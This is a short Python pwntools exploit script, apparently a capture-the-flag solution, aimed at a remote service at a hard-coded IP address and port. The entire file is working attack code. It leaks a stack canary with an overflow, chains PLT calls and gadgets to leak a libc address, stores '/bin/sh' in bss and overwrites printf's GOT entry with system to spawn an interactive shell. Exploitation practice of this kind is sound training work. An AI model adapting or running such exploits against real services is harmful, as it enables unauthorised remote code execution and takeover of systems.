from pwn import *

time = 0.05

read_got = 0x804a00c
printf_got = 0x804a010

read_plt = 0x8048390
printf_plt = 0x80483a0

pr_gadget = 0x0804860b
pppr_gadget = 0x08048609

sys_offset = 0x99b10

bss = 0x0804a028

p = remote("132.226.171.228", 14002)

input("stop")
cannary_pay = b''
cannary_pay += b'A'*0x21		 #1 read --> cannary leak
p.sendafter("> ",cannary_pay)
p.recvuntil("A" * 0x20)

cannary = u32(p.recv(4)) - ord('A')


p.recv(4)
pay = b''				## 2 read --> got chaning
pay += b"A" * 0x20      ## 
pay += p32(cannary)     ## cannary
pay += b"A" * 12	    ## sfp
pay += p32(printf_plt)	## run
pay += p32(pppr_gadget)			
pay += p32(read_got)  	## read_arr --> to know system arr
pay += p32(0)
pay += p32(0)
## 1

pay += p32(read_plt)
pay += p32(pppr_gadget)
pay += p32(0)
pay += p32(bss)
pay += p32(8) #binsh save
##2


pay += p32(read_plt)
pay += p32(pppr_gadget)
pay += p32(0)
pay += p32(printf_got)	# printf arr --> system arr
pay += p32(4)
##3

pay += p32(printf_plt)	# run system 
pay += b"A" * 4
pay += p32(bss)			# binsh

p.send(pay)

read_arr = u32(p.recv(4))
print(hex(read_arr))

input("stop1")

sys_arr = read_arr - sys_offset


p.send('/bin/sh\x00')	## read binsh to save it at bss

p.send(p32(sys_arr))   ## overwite printf --> system

p.interactive()